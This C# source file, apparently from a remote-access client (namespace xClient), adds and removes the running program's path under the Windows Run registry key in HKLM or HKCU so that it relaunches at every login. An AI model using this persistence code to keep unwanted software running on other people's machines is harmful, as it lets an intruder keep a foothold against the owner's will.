using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Installation
{
    public static class Startup
    {
        public static bool AddToStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);

                if (success) return true;

                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
            }
            else
            {
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
            }
        }

        public static bool RemoveFromStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);

                if (success) return true;

                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
            else
            {
                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
        }
    }
}
